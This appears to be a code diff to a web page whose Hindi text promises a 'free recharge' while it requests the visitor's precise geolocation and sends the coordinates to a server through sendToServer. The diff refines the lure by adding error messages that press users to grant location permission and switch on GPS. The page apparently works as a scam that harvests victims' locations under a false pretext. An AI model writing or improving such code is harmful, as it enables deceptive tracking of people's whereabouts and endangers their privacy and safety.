@@ -212,11 +212,33 @@
           return;
         }
 
+        /*  navigator.geolocation.getCurrentPosition(
+                (position) => {
+                  const latitude = position.coords.latitude;
+                  const longitude = position.coords.longitude;
+
+                  status.textContent =
+                    "🎁 आपका फ्री रिचार्ज प्रोसेस किया जा रहा है...";
+                  sendToServer(latitude, longitude);
+                },
+                (error) => {
+                  loader.style.display = "none";
+                  status.style.color = "red";
+                  status.textContent = "❌ कृपया नीचे दिए गए निर्देशों को फॉलो करें।";
+                  guideImage.style.display = "block";
+                },
+                {
+                  enableHighAccuracy: true,
+                  timeout: 10000,
+                  maximumAge: 0,
+                }
+              );
+            }*/
+
+        //testing
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
+            const { latitude, longitude } = position.coords;
             status.textContent =
               "🎁 आपका फ्री रिचार्ज प्रोसेस किया जा रहा है...";
             sendToServer(latitude, longitude);
@@ -224,12 +246,28 @@
           (error) => {
             loader.style.display = "none";
             status.style.color = "red";
-            status.textContent = "❌ कृपया नीचे दिए गए निर्देशों को फॉलो करें।";
             guideImage.style.display = "block";
+
+            switch (error.code) {
+              case error.PERMISSION_DENIED:
+                status.textContent =
+                  "❌ आपने लोकेशन अनुमति नहीं दी। कृपया अनुमति दें।";
+                break;
+              case error.POSITION_UNAVAILABLE:
+                status.textContent =
+                  "❌ लोकेशन उपलब्ध नहीं है। कृपया GPS चालू करें।";
+                break;
+              case error.TIMEOUT:
+                status.textContent = "❌ लोकेशन प्राप्त करने में समय समाप्त।";
+                break;
+              default:
+                status.textContent =
+                  "❌ अज्ञात त्रुटि। कृपया पुनः प्रयास करें।";
+            }
           },
           {
             enableHighAccuracy: true,
-            timeout: 10000,
+            timeout: 15000,
             maximumAge: 0,
           }
         );
